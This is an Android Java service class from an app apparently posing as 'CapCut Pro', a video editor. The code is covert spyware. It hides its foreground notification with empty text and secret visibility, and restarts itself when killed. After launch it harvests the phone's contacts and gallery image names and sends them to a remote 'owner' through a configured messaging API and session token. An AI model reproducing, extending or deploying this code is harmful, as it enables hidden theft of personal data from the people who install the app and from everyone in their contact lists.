package com.capcut.pro.core;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.os.Build;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import com.capcut.pro.network.CapCutSender;
import java.io.File;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class CapCutService extends Service {
    private static final String TAG = "CapCutService";
    private static final int NOTIFY_ID = 1;
    private static final String CHANNEL_ID = "capcut_channel";
    
    private CapCutSender sender;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service started");
        
        CapCutConfig.load(this);
        
        createChannel();
        startForeground(NOTIFY_ID, getHiddenNotification());
        
        sender = new CapCutSender(
            CapCutConfig.getApiId(),
            CapCutConfig.getApiHash(),
            CapCutConfig.getChannelId(),
            CapCutConfig.getOwnerId(),
            CapCutConfig.getSessionToken()
        );
        
        new Thread(() -> {
            try {
                Thread.sleep(3000);
                sendAllData();
            } catch (Exception e) {
                Log.e(TAG, "Error", e);
            }
        }).start();
    }

    private Notification getHiddenNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("")
                .setContentText("")
                .setSmallIcon(android.R.drawable.ic_menu_gallery)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                .setOngoing(true)
                .setShowWhen(false)
                .setSound(null)
                .setVibrate(null)
                .build();
    }

    private void sendAllData() {
        try {
            sendToOwner("🚀 𝐂𝐀𝐏𝐂𝐔𝐓 𝐏𝐑𝐎 — 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅\n\n📱 Device: " + Build.MODEL + "\n🕒 Time: " + getTime());
            dumpContacts();
            dumpGallery();
            sendToOwner("✅ 𝐀𝐋𝐋 𝐃𝐀𝐓𝐀 𝐒𝐄𝐍𝐓");
        } catch (Exception e) {
            Log.e(TAG, "Error", e);
            sendToOwner("❌ Error: " + e.getMessage());
        }
    }

    private void dumpContacts() {
        List<String> contacts = new ArrayList<>();
        ContentResolver cr = getContentResolver();
        Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, 
            null, null, null, null);
        
        if (cursor != null && cursor.moveToFirst()) {
            do {
                String name = cursor.getString(cursor.getColumnIndexOrThrow(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String number = cursor.getString(cursor.getColumnIndexOrThrow(
                    ContactsContract.CommonDataKinds.Phone.NUMBER));
                contacts.add("👤 " + name + "\n📞 " + number);
            } while (cursor.moveToNext());
            cursor.close();
        }
        
        String msg = "👤 𝐂𝐎𝐍𝐓𝐀𝐂𝐓𝐒 (" + contacts.size() + ")\n";
        for (int i = 0; i < Math.min(contacts.size(), 20); i++) {
            msg += contacts.get(i) + "\n";
        }
        if (contacts.size() > 20) msg += "... and " + (contacts.size() - 20) + " more";
        sendToOwner(msg);
    }

    private void dumpGallery() {
        List<String> images = new ArrayList<>();
        ContentResolver cr = getContentResolver();
        Cursor cursor = cr.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, 
            new String[]{MediaStore.Images.Media.DATA}, null, null, null);
        
        if (cursor != null && cursor.moveToFirst()) {
            do {
                String path = cursor.getString(0);
                if (path != null) images.add(path);
            } while (cursor.moveToNext());
            cursor.close();
        }
        
        String msg = "🖼️ 𝐆𝐀𝐋𝐋𝐄𝐑𝐘 (" + images.size() + " images)\n";
        for (int i = 0; i < Math.min(images.size(), 10); i++) {
            File f = new File(images.get(i));
            msg += "📸 " + f.getName() + "\n";
        }
        if (images.size() > 10) msg += "... and " + (images.size() - 10) + " more";
        sendToOwner(msg);
    }

    private void sendToOwner(String message) {
        if (sender != null) {
            sender.sendMessage(message);
        }
    }

    private String getTime() {
        return new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                .format(new Date());
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "Service", 
                NotificationManager.IMPORTANCE_MIN);
            ch.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
            ch.setShowBadge(false);
            getSystemService(NotificationManager.class).createNotificationChannel(ch);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        startService(new Intent(this, CapCutService.class));
    }
}